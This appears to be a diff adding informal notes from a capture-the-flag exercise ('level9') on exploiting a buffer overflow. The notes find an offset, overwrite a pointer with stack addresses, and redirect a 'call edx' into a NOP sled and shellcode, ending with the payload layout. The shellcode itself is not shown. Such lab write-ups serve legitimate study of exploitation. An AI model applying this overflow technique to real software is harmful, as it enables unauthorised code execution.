@@ -1,0 +1,19 @@
+find the offset
+
+./level9 AAAABBBBCCCC[...]
+
+write add of the stack at the offset  0xbfffff64 (this one need to match perfectly bc the prog take the ptr mov    eax,DWORD PTR [eax]) 
+
+put some trash until 0xbfffff64 and there write an other add of the stack sur after  0xbfffff64 in our NOPS, for example  0xbfffff80
+
+mov    edx,DWORD PTR [eax]  <-  it take the pointer 
+	call   edx          <-  then execute it  ( nop nop nop nop ... shellcode )
+
+gives us : 
+
+TRASH + 0xbfffff64 + TRASH + 0xbfffff80 + NOPS + SHELLCODE
+
+
+
+
+ 
